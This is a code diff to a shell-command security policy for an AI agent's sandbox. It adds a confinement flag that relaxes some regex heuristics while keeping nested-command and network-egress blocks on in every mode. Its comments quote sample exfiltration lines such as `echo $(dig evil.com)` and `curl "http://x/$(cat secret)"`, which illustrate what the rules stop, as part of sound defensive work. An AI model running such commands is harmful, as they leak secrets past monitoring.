@@ -15,6 +15,7 @@ import {
   detectDangerousInvokeBin,
   detectInlineNetwork,
   detectInlineInterpreterEval,
+  detectNestedCommandExecution,
   tokenizeCommand,
 } from "./shell-detectors.js";
 
@@ -39,7 +40,40 @@ export function evaluateShellCommand(
   // Injected so tests can pin either platform branch deterministically on any
   // OS. Production callers omit it.
   platform: NodeJS.Platform = process.platform,
+  // EFFECTIVE OS-level confinement of THIS spawn: true only when the sandbox
+  // backend that will actually wrap the shell is a confined one (guarded
+  // seatbelt/bwrap, explicit seatbelt/bwrap, or docker). Callers derive it
+  // from getSandboxStatus().confined, which already folds in fallback — a
+  // "guarded" SELECTION that fell back to host reports confined=false, so the
+  // string rules stay on. Optional so untouched callers/tests fail SAFE
+  // (undefined → treated as unconfined → every rule applies).
+  sandboxConfined?: boolean,
 ): SecurityDecision {
+  // ── Structural-heuristic switch (see each CONFINED-SKIP comment below) ──
+  // Rule groups in this function are best-effort STRING approximations of a
+  // process boundary and stand down when the spawn is kernel-confined:
+  // script-write, interpreter-escape, the inline-eval form refusal, ARITHMETIC
+  // `$((…))` / PARAMETER `${…}` expansion, command separators (`;`/`&&`/`||`/
+  // `&`/newline), and the >5-pipe cap. When a kernel cage wraps the spawn,
+  // everything the command chains / expands / pipes to runs inside the SAME
+  // cage, so these regexes add no boundary the kernel doesn't already enforce
+  // — while false-blocking legitimate work (`echo $((17+3))`, `a; b`,
+  // multi-statement self-tests, 52 legit `python3 -c` calls over 7 weeks).
+  // Skipped under effective confinement, kept unconfined. win32 never skips:
+  // no confined native backend exists there (PowerShell already gets laxer
+  // rules; docker-on-Windows isn't worth a semantics split).
+  //
+  // NOT gated on confinement — these stay on in EVERY mode: obfuscation,
+  // {{SECRET}} placeholders, browser-open, the network-client argv0 blocks +
+  // BLOCKED_COMMANDS denylist (the guarded cage KEEPS network, so egress
+  // control is this policy's job, not the sandbox's), inline-NETWORK bodies,
+  // dangerous-invoke bins, the mode-aware rm rules + catastrophic floor, AND —
+  // critically — the nested-command-execution constructs (command substitution
+  // `$(…)` (NOT arithmetic `$((`), backticks, subshell `( )`, brace-group
+  // `{ ; }`, procsub `<(…)`): their nested argv escapes the network/denylist
+  // scan, so relaxing them under confinement would open egress vectors like
+  // `echo $(dig evil.com)`. See detectNestedCommandExecution.
+  const structuralRulesApply = sandboxConfined !== true || platform === "win32";
   // Obfuscation detection
   try {
     const obfuscationResult = detectObfuscation(command);
@@ -71,17 +105,31 @@ export function evaluateShellCommand(
     };
   }
 
-  // Block heredoc + inline-script writes (forces use of write/edit tools)
-  const scriptWriteResult = detectScriptWrite(command);
-  if (scriptWriteResult) {
-    return { allowed: false, reason: scriptWriteResult, userHint: USER_HINTS.commandShell };
+  // Block heredoc + inline-script writes (forces use of write/edit tools).
+  // CONFINED-SKIP: the write itself lands inside the kernel cage (and the
+  // file-access path guard below still vets every path it can see), so the
+  // security value is subsumed; the residual "bash exit 0 ≠ work done"
+  // quality nudge doesn't justify false-blocking legit heredoc scripting.
+  if (structuralRulesApply) {
+    const scriptWriteResult = detectScriptWrite(command);
+    if (scriptWriteResult) {
+      return { allowed: false, reason: scriptWriteResult, userHint: USER_HINTS.commandShell };
+    }
   }
 
   // C3-13: argv-aware interpreter-escape (perl/ruby/php inline eval with
   // intervening flags — `perl -w -e`, `ruby -rsocket -e`).
-  const interpEscape = detectInterpreterEscape(command);
-  if (interpEscape) {
-    return { allowed: false, reason: interpEscape, userHint: USER_HINTS.commandShell };
+  // CONFINED-SKIP: an inline-eval'd interpreter body executes with exactly
+  // the authority of the caged shell that spawned it — no boundary is crossed
+  // that the kernel doesn't already hold. Egress from such a body is still
+  // caught in every mode by detectInlineNetwork below and by the
+  // BLOCKED_COMMANDS backstops (`perl -e`/`ruby -e`/`php -r` bare forms),
+  // which stay untouched.
+  if (structuralRulesApply) {
+    const interpEscape = detectInterpreterEscape(command);
+    if (interpEscape) {
+      return { allowed: false, reason: interpEscape, userHint: USER_HINTS.commandShell };
+    }
   }
 
   // C3-12/C3-14: network clients gated by argv[0] basename (fetch/http/xh/…),
@@ -107,7 +155,13 @@ export function evaluateShellCommand(
   // the body-regex detectInlineNetwork so the specific "write a script file"
   // reason wins. No-op when inlineEval/workspace weren't threaded through, or
   // when policy="allow". Per pipe segment so each argv[0] is inspected.
-  if (inlineEval !== undefined && workspace !== undefined) {
+  // CONFINED-SKIP: the refusal exists because "a regex can't soundly vet a
+  // Turing-complete inline body" — under a confined backend we don't NEED to
+  // vet it: the kernel cage bounds what the body can do exactly as it would a
+  // script file, so the FORM is no longer the risk (this rule alone denied 52
+  // legit `python3 -c` self-checks in 7 weeks). detectInlineNetwork below
+  // still scans inline bodies for network use in every mode.
+  if (structuralRulesApply && inlineEval !== undefined && workspace !== undefined) {
     for (const segment of command.split("|")) {
       const hit = detectInlineInterpreterEval(tokenizeCommand(segment), inlineEval, workspace);
       if (hit) {
@@ -123,40 +177,77 @@ export function evaluateShellCommand(
     return { allowed: false, reason: inlineNet, userHint: USER_HINTS.commandShell };
   }
 
-  // Block dangerous shell metacharacters (command chaining, subshells, command substitution)
-  // Allow: | (pipes, controlled below), > < (redirects), * ? (globs)
-  // Block dangerous shell metacharacters — platform-aware
-  if (platform === "win32") {
-    // PowerShell: backtick is the escape char, ${} is variable syntax, {} is script blocks — all normal
-    // Only block actual dangerous patterns: Invoke-Expression, iex, & (call operator at start)
-    if (/\r\n/.test(command)) {
-      return { allowed: false, reason: "Blocked: multi-line commands not allowed.", userHint: USER_HINTS.commandShell };
+  // ALWAYS-ON (NOT gated on confinement), POSIX only: nested-command execution
+  // — $(...) command sub (but not $(( )) arithmetic / ${} param expansion),
+  // backticks, subshell ( ), brace-group { ; }, procsub <(…)/>(…). The argv[0]
+  // network/denylist scans can't see a binary invoked inside these, so a
+  // confined spawn (where the metachar/separator heuristics below stand down)
+  // could otherwise `echo $(dig evil.com)` its way to real egress. Egress
+  // control IS this policy's job under confinement — the guarded cage keeps
+  // network on — and parsing inside a substitution is a bypassable adversarial
+  // surface, so we keep these execute-a-nested-command forms blocked rather
+  // than scan within them. win32 is excluded: `$(…)` and `( )` are ordinary
+  // PowerShell syntax there, and win32 has no confined backend to relax around.
+  if (platform !== "win32") {
+    const nested = detectNestedCommandExecution(command);
+    if (nested) {
+      return { allowed: false, reason: nested, userHint: USER_HINTS.commandShell };
     }
-  } else {
-    // Bash: block command substitution — backtick, $(), ${}. Kept on the RAW
-    // command because backtick/$() inside DOUBLE quotes are still expanded by
-    // bash (so `curl "http://x/$(cat secret)"` stays blocked). A single-quoted
-    // occurrence is literal, but blocking it too is a rare, harmless FP.
-    if (/`/.test(command) || /\$\(/.test(command) || /\$\{/.test(command)) {
-      return { allowed: false, reason: "Blocked: shell metacharacters detected (backtick or command substitution).", userHint: USER_HINTS.commandShell };
-    }
-    // Separators — newline, ;, bare & — count only OUTSIDE quotes, so quote-strip
-    // first. A newline or `;` INSIDE a quoted argument (a multi-line
-    // `python3 -c 'line1\nline2'` self-test, or the `;` in `python -c "import
-    // json; ..."`) is literal string content, not command chaining. Before this
-    // was quote-aware, the newline check lived with the backtick check above and
-    // blocked EVERY multi-statement inline self-test (mislabeled as command
-    // substitution) — so a coding model couldn't run its own multi-line check
-    // and shipped unverified, false-done work. An UNQUOTED newline is still a
-    // command separator (like ;) and stays blocked.
-    // The & exclusions also spare fd-redirect forms — 2>&1, >&2, &>file all carry
-    // a literal & that is job-control NOTHING (it's a descriptor dup/merge).
-    const unquoted = stripQuotedSpans(command);
-    if (/[\r\n]/.test(unquoted)) {
-      return { allowed: false, reason: "Blocked: a newline outside quotes chains commands. Put multi-line code inside a single quoted -c/-e argument, e.g. python3 -c 'line1\\nline2', or write it to a file and run that.", userHint: USER_HINTS.commandShell };
-    }
-    if (/;/.test(unquoted) || /(?<![&|<>])&(?![&|>])/.test(unquoted)) {
-      return { allowed: false, reason: "Blocked: use && instead of ; for chaining, and don't background processes with &.", userHint: USER_HINTS.commandShell };
+  }
+
+  // Block dangerous shell metacharacters (command chaining + arithmetic/param
+  // expansion). Allow: | (pipes, controlled below), > < (redirects), * ? (globs).
+  // CONFINED-SKIP (whole platform branch — a no-op for win32, where
+  // structuralRulesApply is always true): chaining (unquoted newline / `;` /
+  // bare `&`) and expansion (`$((…))` arithmetic, `${…}` params) execute in the
+  // SAME confined process tree with the SAME kernel-enforced denials as the
+  // outer command — they cross no boundary the cage doesn't hold, and they are
+  // exactly the Clover-class false positives (`echo $((17+3))`, `${VAR}`, `a;
+  // b`). NOTE: command substitution proper (`$(…)`, backtick) and the other
+  // nested-command forms are NOT relaxed here — they're handled always-on by
+  // detectNestedCommandExecution above, because their nested argv escapes the
+  // network/denylist scan. The cross-separator egress rules stay immune too:
+  // BLOCKED_COMMANDS + rm scan the raw string, and the argv0 scans segment on
+  // ;/&&/||/&/newline (splitShellSegments), so `true; dig evil.com` is caught.
+  // Unconfined, these regexes remain the wall (the FP cost is the price of the
+  // boundary when there's no kernel cage).
+  if (structuralRulesApply) {
+    if (platform === "win32") {
+      // PowerShell: backtick is the escape char, ${} is variable syntax, {} is script blocks — all normal
+      // Only block actual dangerous patterns: Invoke-Expression, iex, & (call operator at start)
+      if (/\r\n/.test(command)) {
+        return { allowed: false, reason: "Blocked: multi-line commands not allowed.", userHint: USER_HINTS.commandShell };
+      }
+    } else {
+      // Bash: block arithmetic `$((…))` and parameter `${…}` expansion (host
+      // only — relaxed under confinement). Command substitution `$(…)` and
+      // backticks are already refused always-on by detectNestedCommandExecution
+      // (the negative lookahead here would otherwise skip `$((`, but the broad
+      // `\$\(` still catches `$((` on the unconfined host, which is the intent:
+      // no kernel cage → keep the expansion FP-block as the boundary). Kept on
+      // the RAW command because `$(`/backtick inside DOUBLE quotes are still
+      // bash-expanded; a single-quoted occurrence is a rare, harmless FP.
+      if (/`/.test(command) || /\$\(/.test(command) || /\$\{/.test(command)) {
+        return { allowed: false, reason: "Blocked: shell metacharacters detected (backtick or command substitution).", userHint: USER_HINTS.commandShell };
+      }
+      // Separators — newline, ;, bare & — count only OUTSIDE quotes, so quote-strip
+      // first. A newline or `;` INSIDE a quoted argument (a multi-line
+      // `python3 -c 'line1\nline2'` self-test, or the `;` in `python -c "import
+      // json; ..."`) is literal string content, not command chaining. Before this
+      // was quote-aware, the newline check lived with the backtick check above and
+      // blocked EVERY multi-statement inline self-test (mislabeled as command
+      // substitution) — so a coding model couldn't run its own multi-line check
+      // and shipped unverified, false-done work. An UNQUOTED newline is still a
+      // command separator (like ;) and stays blocked.
+      // The & exclusions also spare fd-redirect forms — 2>&1, >&2, &>file all carry
+      // a literal & that is job-control NOTHING (it's a descriptor dup/merge).
+      const unquoted = stripQuotedSpans(command);
+      if (/[\r\n]/.test(unquoted)) {
+        return { allowed: false, reason: "Blocked: a newline outside quotes chains commands. Put multi-line code inside a single quoted -c/-e argument, e.g. python3 -c 'line1\\nline2', or write it to a file and run that.", userHint: USER_HINTS.commandShell };
+      }
+      if (/;/.test(unquoted) || /(?<![&|<>])&(?![&|>])/.test(unquoted)) {
+        return { allowed: false, reason: "Blocked: use && instead of ; for chaining, and don't background processes with &.", userHint: USER_HINTS.commandShell };
+      }
     }
   }
 
@@ -164,13 +255,20 @@ export function evaluateShellCommand(
   // Quote-aware: literal `|` inside `"..."` / `'...'` doesn't count, and
   // `||` is a chain operator not a pipe. Naive matching false-positived
   // benign commands like `echo "a|b|c|d|e|f"` against this 5-pipe cap.
-  const pipeCount = countTopLevelPipes(command);
-  if (pipeCount > 5) {
-    return {
-      allowed: false,
-      reason: `Blocked: too many pipes (${pipeCount}). Maximum 5 pipes allowed per command.`,
-      userHint: USER_HINTS.commandShell,
-    };
+  // CONFINED-SKIP: pipeline length is an obfuscation/complexity heuristic,
+  // not a boundary — every stage runs inside the same cage, each stage's
+  // argv0 is scanned per-segment, and the denylist scans the full string
+  // regardless of pipe count. Unconfined, the cap stays as friction against
+  // multi-stage obfuscated exfil chains.
+  if (structuralRulesApply) {
+    const pipeCount = countTopLevelPipes(command);
+    if (pipeCount > 5) {
+      return {
+        allowed: false,
+        reason: `Blocked: too many pipes (${pipeCount}). Maximum 5 pipes allowed per command.`,
+        userHint: USER_HINTS.commandShell,
+      };
+    }
   }
 
   // Destructive rm (-r/-f), MODE-AWARE. In unrestricted mode the user has
